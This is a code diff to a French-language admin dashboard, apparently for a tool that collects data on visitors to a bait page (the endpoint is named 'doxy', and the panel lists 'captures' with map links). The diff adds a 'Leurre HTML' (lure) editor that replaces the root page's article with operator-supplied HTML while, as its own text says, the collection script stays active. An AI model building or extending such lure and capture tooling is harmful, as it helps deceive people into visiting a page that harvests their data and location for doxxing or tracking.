@@ -41,6 +41,16 @@ td.badge{font-size:11px;padding:3px 9px;border-radius:10px}
 pre{background:#0a0d11;border:1px solid #1e2833;border-radius:8px;padding:12px;font-size:11px;overflow-x:auto;color:#93a8bd;max-height:260px;overflow-y:auto}
 a.maps{color:#5ea9e6}
 .empty{padding:40px;text-align:center;color:#5c7085}
+.bait{background:#12161d;border:1px solid #243040;border-radius:12px;padding:14px 16px;margin-bottom:14px;display:flex;flex-wrap:wrap;align-items:center;justify-content:space-between;gap:10px}
+.baitL{display:flex;flex-direction:column;gap:3px}
+.baitL b{color:#7fa2c7;font-size:14px}
+#baitState{font-size:12px;color:#8a9fb5}
+.baitR{display:flex;align-items:center;gap:8px;flex-wrap:wrap}
+.baitR button{margin:0;width:auto;padding:8px 12px;font-size:12px}
+.ghost{background:#233041 !important}
+#baitReset{background:#5c2f2f !important}
+#baitHtml{width:100%;min-height:150px;background:#0b0e13;border:1px solid #2c3846;color:#dce3ea;border-radius:8px;padding:10px;font-family:Consolas,monospace;font-size:12px;resize:vertical}
+#baitMsg{width:100%;font-size:12px;min-height:14px;color:#8a9fb5}
 @media(max-width:720px){th,td{padding:8px}#q{width:100%}}
 </style>
 </head>
@@ -67,6 +77,17 @@ a.maps{color:#5ea9e6}
     </div>
   </header>
 
+  <div class="bait">
+    <div class="baitL"><b>Leurre HTML</b><span id="baitState">—</span></div>
+    <div class="baitR">
+      <button class="ghost" onclick="loadBait(true)">Recharger</button>
+      <button onclick="saveBait()">Enregistrer</button>
+      <button id="baitReset" onclick="resetBait()" style="display:none">Rétablir l'article d'origine</button>
+    </div>
+    <textarea id="baitHtml" placeholder="Colle ici le HTML de l'article (fragment ou document complet). Il remplace l'article de la page racine ; le script de collecte reste intact."></textarea>
+    <div id="baitMsg"></div>
+  </div>
+
   <table id="tbl">
     <thead><tr>
       <th onclick="sort('t')">Heure ▾</th>
@@ -84,15 +105,15 @@ a.maps{color:#5ea9e6}
 </div>
 
 <script>
-const DOXY='/api/v1/doxy', DATA='/api/v1/dataview';
-let list=[], opened=null, curSort='t', asc=false;
+const DOXY='/api/v1/doxy', DATA='/api/v1/dataview', PAGE='/api/v1/page';
+let list=[], opened=null, curSort='t', asc=false, baitOn=false;
 
 async function P(u,o){try{const r=await fetch(u,o);return r.ok&&r.status!==204?await r.json():null}catch(e){return null}}
 
 async function doLogin(){
   const p=document.getElementById('pass').value;
   const j=await P(DOXY,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({p:p})});
-  if(j){document.getElementById('login').style.display='none';document.getElementById('app').style.display='block';load();startAuto()}
+  if(j){document.getElementById('login').style.display='none';document.getElementById('app').style.display='block';load();startAuto();loadBait()}
   else{document.getElementById('lerr').textContent='Accès refusé';}
 }
 
@@ -215,6 +236,40 @@ async function flushAll(){
   if(!confirm('Effacer toutes les captures ?'))return;
   await P(DATA,{method:'POST',headers:{'Content-Type':'application/json'},body:'{"f":1}'});
   await load();
+}
+
+async function loadBait(showMsg){
+  const msg=document.getElementById('baitMsg');
+  if(showMsg){msg.style.color='#8a9fb5';msg.textContent='Chargement...'}
+  try{
+    const r=await fetch(PAGE,{cache:'no-store'});
+    if(r.ok){document.getElementById('baitHtml').value=await r.text();baitOn=true}
+    else{document.getElementById('baitHtml').value='';baitOn=false}
+    baitRender();
+    if(showMsg){msg.textContent=baitOn?'Leurre HTML chargé.':'Aucun leurre HTML — article d’origine.'}
+  }catch(e){if(showMsg){msg.style.color='#e07a7a';msg.textContent='Erreur de chargement.'}}
+}
+function baitRender(){
+  document.getElementById('baitState').textContent=baitOn?'Leurre HTML actif (remplace l’article)':'Aucun leurre HTML — article d’origine';
+  document.getElementById('baitReset').style.display=baitOn?'inline-block':'none';
+}
+async function saveBait(){
+  const h=document.getElementById('baitHtml').value;
+  const msg=document.getElementById('baitMsg');
+  msg.style.color='#8a9fb5';
+  if(!h.trim()){msg.textContent='Le HTML est vide.';return}
+  msg.textContent='Enregistrement...';
+  const j=await P(PAGE,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({h:h})});
+  if(j&&j.ok){baitOn=true;baitRender();msg.style.color='#7ed7a1';msg.textContent='Leurre HTML enregistré — recharge la page racine (Ctrl+F5).'}
+  else{msg.style.color='#e07a7a';msg.textContent='Échec : session expirée ou HTML trop gros (max 200 Ko).'}
+}
+async function resetBait(){
+  if(!confirm('Rétablir l’article d’origine ?'))return;
+  await P(PAGE,{method:'DELETE'});
+  baitOn=false;baitRender();
+  document.getElementById('baitHtml').value='';
+  document.getElementById('baitMsg').style.color='#8a9fb5';
+  document.getElementById('baitMsg').textContent='Article d’origine rétabli.';
 }
 
 let timer=null;
